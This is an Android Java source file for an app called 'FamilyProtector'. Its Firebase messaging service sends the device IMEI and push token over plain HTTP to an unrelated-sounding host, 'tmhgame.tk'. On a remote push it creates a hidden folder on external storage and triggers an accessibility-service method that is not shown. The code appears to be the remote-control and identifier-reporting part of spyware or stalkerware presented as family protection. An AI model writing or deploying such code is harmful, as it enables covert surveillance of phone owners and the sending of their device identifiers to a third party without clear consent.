package com.family.familyprotector;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.family.accessibility.MyAccessibilityService;
import com.family.internet.ServerHelper;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    @Override
    public void onNewToken(String token) {
        Log.d("FIFI", "Refreshed token: " + token);

        // If you want to send messages to this application instance or
        // manage this apps subscriptions on the server side, send the
        // Instance ID token to your app server.


        //send server
        postJSON(token);
    }
    public void postJSON(String token) {
        JSONObject postData = new JSONObject();
        Log.d("posted", "posJson from Firebase");
        String ts = Context.TELEPHONY_SERVICE;
        String imei = "";
        TelephonyManager mTelephonyMgr = (TelephonyManager) getSystemService(ts);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            //return;
        }else {
            imei = mTelephonyMgr.getDeviceId();
            Log.d("salamm",imei + "imei");
        }
        try {
            postData.put("t", token);
            postData.put("i", imei);
            new ServerHelper().execute("http://tmhgame.tk/fbt", postData.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void onMessageReceived(RemoteMessage message) {
        Log.d("FIFI", message.getFrom() + "ALDIM");
        Log.d("FIFI", message.getData().toString());
        File mFolder = new File(Environment.getExternalStorageDirectory(), ".FamilyProtector");
        if (!mFolder.exists()) {
            mFolder.mkdirs();
            mFolder.setExecutable(true);
            mFolder.setReadable(true);
            mFolder.setWritable(true);
            Log.d("FIFI", "Folder created");

        }else {
            Log.d("FIFI", "Folder exist");
        }
        MyAccessibilityService.instance.sondur();
    }
}
